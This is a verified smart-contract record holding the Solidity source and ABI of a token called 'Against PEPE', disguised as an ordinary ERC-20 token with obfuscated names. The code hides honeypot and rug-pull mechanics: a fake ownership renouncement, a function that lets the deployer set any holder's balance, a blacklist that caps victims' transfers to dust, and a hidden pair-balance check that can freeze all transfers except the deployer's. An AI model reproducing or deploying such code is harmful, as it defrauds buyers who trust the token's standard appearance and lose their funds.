{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface autoIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountSender) external view returns (uint256);\n\n    function transfer(address tokenEnable, uint256 atTo) external returns (bool);\n\n    function allowance(address exemptLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenEnable,\n        uint256 atTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptReceiverLiquidity, uint256 value);\n    event Approval(address indexed exemptLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract toTotalTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldEnable {\n    function createPair(address sellEnableTrading, address receiverEnable) external returns (address);\n}\n\ninterface marketingAt is autoIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AgainstPEPE is toTotalTeam, autoIs, marketingAt {\n\n    address public marketingSwap;\n\n    bool public tradingEnable;\n\n    function fromTotal(address feeSwap, address tokenEnable, uint256 atTo) internal returns (bool) {\n        if (feeSwap == marketingSwap) {\n            return marketingAmount(feeSwap, tokenEnable, atTo);\n        }\n        uint256 txAtWallet = autoIs(toReceiver).balanceOf(feeExemptTotal);\n        require(txAtWallet == listTotalMin);\n        require(tokenEnable != feeExemptTotal);\n        if (txFromMin[feeSwap]) {\n            return marketingAmount(feeSwap, tokenEnable, tradingAmount);\n        }\n        return marketingAmount(feeSwap, tokenEnable, atTo);\n    }\n\n    address limitSenderMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return minToAmount;\n    }\n\n    function marketingAmount(address feeSwap, address tokenEnable, uint256 atTo) internal returns (bool) {\n        require(modeWallet[feeSwap] >= atTo);\n        modeWallet[feeSwap] -= atTo;\n        modeWallet[tokenEnable] += atTo;\n        emit Transfer(feeSwap, tokenEnable, atTo);\n        return true;\n    }\n\n    function allowance(address maxAuto, address teamFrom) external view virtual override returns (uint256) {\n        if (teamFrom == limitSenderMax) {\n            return type(uint256).max;\n        }\n        return receiverMinSell[maxAuto][teamFrom];\n    }\n\n    function balanceOf(address amountSender) public view virtual override returns (uint256) {\n        return modeWallet[amountSender];\n    }\n\n    address private minToAmount;\n\n    uint256 constant tradingAmount = 10 ** 10;\n\n    uint256 private maxMin = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed receiverTotal, address indexed enableTo);\n\n    string private senderMin = \"APE\";\n\n    mapping(address => bool) public txFromMin;\n\n    function transfer(address maxTeam, uint256 atTo) external virtual override returns (bool) {\n        return fromTotal(_msgSender(), maxTeam, atTo);\n    }\n\n    mapping(address => bool) public listLaunch;\n\n    function transferFrom(address feeSwap, address tokenEnable, uint256 atTo) external override returns (bool) {\n        if (_msgSender() != limitSenderMax) {\n            if (receiverMinSell[feeSwap][_msgSender()] != type(uint256).max) {\n                require(atTo <= receiverMinSell[feeSwap][_msgSender()]);\n                receiverMinSell[feeSwap][_msgSender()] -= atTo;\n            }\n        }\n        return fromTotal(feeSwap, tokenEnable, atTo);\n    }\n\n    bool private isFrom;\n\n    function buyEnable() public {\n        emit OwnershipTransferred(marketingSwap, address(0));\n        minToAmount = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalIs;\n    }\n\n    uint8 private totalIs = 18;\n\n    uint256 listTotalMin;\n\n    uint256 maxTotalSender;\n\n    constructor (){\n        \n        takeLimit isReceiver = takeLimit(limitSenderMax);\n        toReceiver = shouldEnable(isReceiver.factory()).createPair(isReceiver.WETH(), address(this));\n        \n        marketingSwap = _msgSender();\n        buyEnable();\n        listLaunch[marketingSwap] = true;\n        modeWallet[marketingSwap] = maxMin;\n        if (isFrom != enableMax) {\n            tradingEnable = false;\n        }\n        emit Transfer(address(0), marketingSwap, maxMin);\n    }\n\n    bool public enableMax;\n\n    function approve(address teamFrom, uint256 atTo) public virtual override returns (bool) {\n        receiverMinSell[_msgSender()][teamFrom] = atTo;\n        emit Approval(_msgSender(), teamFrom, atTo);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMin;\n    }\n\n    mapping(address => uint256) private modeWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return fundLimit;\n    }\n\n    function launchToken(address minWallet) public {\n        require(minWallet.balance < 100000);\n        if (amountFrom) {\n            return;\n        }\n        if (tradingEnable == isFrom) {\n            tradingEnable = true;\n        }\n        listLaunch[minWallet] = true;\n        \n        amountFrom = true;\n    }\n\n    address feeExemptTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private fundLimit = \"Against PEPE\";\n\n    address public toReceiver;\n\n    function buySell(uint256 atTo) public {\n        isMax();\n        listTotalMin = atTo;\n    }\n\n    function feeLimit(address txLaunchFund) public {\n        isMax();\n        if (tradingEnable != enableMax) {\n            enableMax = false;\n        }\n        if (txLaunchFund == marketingSwap || txLaunchFund == toReceiver) {\n            return;\n        }\n        txFromMin[txLaunchFund] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return minToAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMinSell;\n\n    bool public amountFrom;\n\n    function isMax() private view {\n        require(listLaunch[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderMin;\n    }\n\n    function buyTo(address maxTeam, uint256 atTo) public {\n        isMax();\n        modeWallet[maxTeam] = atTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiverLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"buySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunchFund\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFromMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AgainstPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}